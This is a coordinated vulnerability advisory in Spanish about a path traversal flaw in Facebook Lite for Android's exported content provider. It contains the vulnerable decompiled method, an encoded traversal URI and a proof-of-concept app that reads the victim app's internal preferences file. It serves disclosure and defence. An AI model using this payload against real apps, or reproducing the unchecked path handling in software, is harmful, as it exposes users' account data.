
# Vulnerabilidad en la aplicación Facebook Lite para Android


## 1. Información del reporte

**Título:** Vulnerabilidad en la aplicación Facebook Lite para Android

**Reporte ID:** STIC-2015-2012

**Reporte URL:** [http://www.fundacionsadosky.org.ar/publicaciones/#seguridad-en-tic](http://www.fundacionsadosky.org.ar/publicaciones/#seguridad-en-tic)

**Fecha de publicación:** 2015-12-01

**Fecha de última actualización:** 2016-02-2

**Fabricantes contactados:** Facebook

**Modo de publicación:** Coordinado



## 2. Información de vulnerabilidades

**Clase:**  Improper Limitation of a Pathname to a Restricted Directory [[http://cwe.mitre.org/data/definitions/22.html](http://cwe.mitre.org/data/definitions/22.html)]

**Impacto:** Perdida de datos

**Remotamente explotable:** Si

**Localmente explotable:** Si

**Identificador CVE:** N/A



## 3. Descripción de vulnerabilidad

Facebook Lite es una versión más liviana de la aplicación de la red social Facebook, diseñada para aquellos países donde las redes inalámbricas son lentas o para descargar en dispositivos que no tienen capacidad para soportar la versión original de la aplicación.

La aplicación, que cuenta con entre 50 y 100 millones de descargas (a enero de 2016), tiene una vulnerabilidad de Path Traversal que permite a otras aplicaciones acceder a archivos guardados en el almacenamiento interno de la aplicación. Esto permitiría a una aplicación maliciosa, sin necesidad de solicitar ningún permiso, podría, de este modo, tomar completo control de la cuenta de Facebook instalada en el dispositivo de la víctima.


## 4. Paquetes vulnerables

* Facebook Lite version 1.15.0.137.302 o anteriores

## 5. Información y soluciones del fabricante

Facebook reconoció y solucionó la vulnerabilidad en la versión 1.16.0.155.350 de la aplicación, publicada el 28 de Enero, 2016..


## 6. Créditos

Las vulnerabilidades fueron descubiertas e investigadas por Joaquín Manuel Rinaudo. La publicación de este reporte fue coordinada por Programa Seguridad en TIC. 

## 7. Descripción técnica

La aplicación exporta un provider llamado MediaContentProvider vulnerable a Path Traversal. Al llamar al método openFile de dicho ContentProvider, la aplicación obtiene el último segmento directamente de la URI, que es controlada por el atacante y puede apuntar a una ruta relativa a cualquier archivo de forma codificada.

El siguiente método vulnerable es de la clase _com.facebook.lite.photo.MediaContentProvider_.

```
    public ParcelFileDescriptor openFile(Uri r5_Uri, String r6_String) {
        new StringBuilder("photo/called with uri: ").append(r5_Uri);
        if (this.a.match(r5_Uri) == 1) {
            File r0_File = new File(getContext().getFilesDir(), r5_Uri.getLastPathSegment());
            if (!r0_File.exists()) {
                try {
                    r0_File.createNewFile();
                } catch (IOException e) {
                    Log.e("MediaContentProvider", "photo/create new file failed", e);
                }
            }
            return ParcelFileDescriptor.open(r0_File, 805306368);
        } else {
            new StringBuilder("photo/unsupported uri: ").append(r5_Uri);
            throw new FileNotFoundException(new StringBuilder("Unsupported uri: ").append(r5_Uri.toString()).toString());
        }
    }


```


Por ejemplo, cuando un atacante haciendo un pedido a la URI _content://com.facebook.lite.media/..%2Fshared_prefs%2Frti.mqtt.ids.xml_, el último segmento se traduce a _../shared_prefs/rti.mqtt.ids.xml_. Esto permitiría que dicho archivo, que reside en la memoria interna de la aplicación, sea leido por una aplicación maliciosa.

El POC provisto muestra como cualquier aplicación puede leer un archivo interno de Facebook Lite: 

```
  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    Uri uriCustom = Uri
        .parse("content://com.facebook.lite.media/..%2Fshared_prefs%2Frti.mqtt.ids.xml");
    InputStream fileStream;
    try {
      fileStream = getContentResolver().openInputStream(uriCustom);

      BufferedReader r = new BufferedReader(new InputStreamReader(
          fileStream));
      StringBuilder total = new StringBuilder();
      String line;
      while ((line = r.readLine()) != null) {
        total.append(line);
      }

      fileStream.close();
      Log.d("DEBUG", "string is " + total.toString());
    TextView text = (TextView)findViewById(R.id.file_content);
    text.setText(total);
    } catch (Exception e) {
      Log.d("DEBUG", Log.getStackTraceString(e));
    }
  }



```


## 8. Cronología del reporte

* **2015-11-20:** 
        Se enviaron detalles técnicos de las vulnerabilidades al fabricante.
        
* **2015-11-25:** 
        El fabricante aceptó el reporte y lo reenvió al equipo de desarrollo apropiado.
        
* **2015-12-3:**  consultó acerca del estado del issue.
        
* **2015-12-3:** 
        Dado que no se recibió ninguna respuesta,  preguntó acerca un tiempo estimado para una actualización que solucionase el problema.
        
* **2015-12-3:** 
        Dado que no se recibió ninguna respuesta,  preguntó acerca un tiempo estimado para una actualización que solucionase el problema.
        
* **2016-01-25:** 
        El fabricante aseguró que habían logrado solucionar la vulnerabilidad y que estaban trabajando para realizar una actualización.
        
* **2016-01-26:** 
        El fabricante notificó que lanzaría una actualización esa semana con el problema solucionado.
        
* **2016-02-2:** 
        El reporte fue publicado. 

## 9. Referencias



## 10. Acerca Fundación Dr. Manuel Sadosky

La Fundación Dr. Manuel Sadosky es una institución público privada cuyo objetivo es favorecer la articulación entre el sistema científico – tecnológico y la estructura productiva en todo lo referido a la temática de las Tecnologías de la Información y la Comunicación (TIC). Creada a través del Decreto Nro. 678/09 del Poder Ejecutivo Nacional, la Fundación es presidida por el ministro de Ciencia, Tecnología e Innovación Productiva. Sus vicepresidentes son los presidentes de las cámaras más importantes del sector TIC: CESSI (Cámara de Empresas de Software y Servicios Informáticos) y CICOMRA (Cámara de Informática y Comunicaciones de la República Argentina). Para más información visitar: [http://www.fundacionsadosky.org.ar](http://www.fundacionsadosky.org.ar)

## 11. Derechos de autor

El contenido de este reporte tiene copyright (c) 2014 Fundación Sadosky y se publica bajo la licencia Creative Commons Attribution Non-Commercial Share-Alike 4.0: [http://creativecommons.org/licenses/by-nc-sa/4.0/](http://creativecommons.org/licenses/by-nc-sa/4.0/)